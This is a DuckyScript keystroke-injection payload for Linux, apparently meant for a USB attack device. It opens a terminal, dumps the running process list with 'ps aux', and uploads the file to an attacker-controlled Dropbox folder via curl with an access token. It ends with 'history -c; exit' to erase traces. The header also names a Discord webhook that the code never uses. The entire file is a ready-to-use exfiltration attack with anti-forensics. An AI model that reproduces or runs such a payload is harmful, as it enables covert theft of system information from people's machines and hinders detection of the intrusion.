REM_BLOCK
##########################################
#                                        #
# Title        : Exfiltrate Process Info #
# Author       : Aleff                   #
# Version      : 1.0                     #
# Category     : Exfiltration            #
# Target       : Linux                   #
#                                        #
##########################################
END_REM

REM Requirements:
REM     - Internet Connection
REM     - Discord Webhook

REM Set yout Dropbox folder name
DEFINE #DROPBOX_FOLDER_NAME example

REM This is just a Dropbox const, don't edit
DEFINE #DROPBOX_API_CONST https://content.dropboxapi.com/2/files/upload

EXTENSION DETECT_READY
    REM VERSION 1.1
    REM AUTHOR: Korben

    REM_BLOCK DOCUMENTATION
        USAGE:
            Extension runs inline (here)
            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
            boot delay

        TARGETS:
            Any system that reflects CAPSLOCK will detect minimum required delay
            Any system that does not reflect CAPSLOCK will hit the max delay of 3000ms
    END_REM

    REM CONFIGURATION:
    DEFINE #RESPONSE_DELAY 25
    DEFINE #ITERATION_LIMIT 120

    VAR $C = 0
    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
        CAPSLOCK
        DELAY #RESPONSE_DELAY
        $C = ($C + 1)
    END_WHILE
    CAPSLOCK
END_EXTENSION

CTRL-ALT t
DELAY 2000

REM #### GET PROCESS SECTION ####
STRINGLN ps aux > process.txt
DELAY 500

REM #### EXFILTRATE SECTION ####
REM Required: Set here your Dropbox access TOKEN
DEFINE TOKEN example
STRINGLN ACCESS_TOKEN="#TOKEN"
DELAY 500

STRINGLN USER_NAME=$(whoami)
DELAY 500

STRINGLN TXT_PATH="/home/$USER_NAME/process.txt"
DELAY 500

STRINGLN DROPBOX_FOLDER="/#DROPBOX_FOLDER_NAME"
DELAY 500

STRINGLN curl -X POST#DROPBOX_API_CONST --header "Authorization: Bearer $ACCESS_TOKEN" --header "Dropbox-API-Arg: {\"path\": \"$DROPBOX_FOLDER\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" --header "Content-Type: application/octet-stream" --data-binary "@$TXT_PATH"

REM It depends by the internet connection, btw 1 or 2 seconds, generally, is sufficient
DELAY 2000

REM #### REMOVE TRACES ####
STRINGLN history -c; exit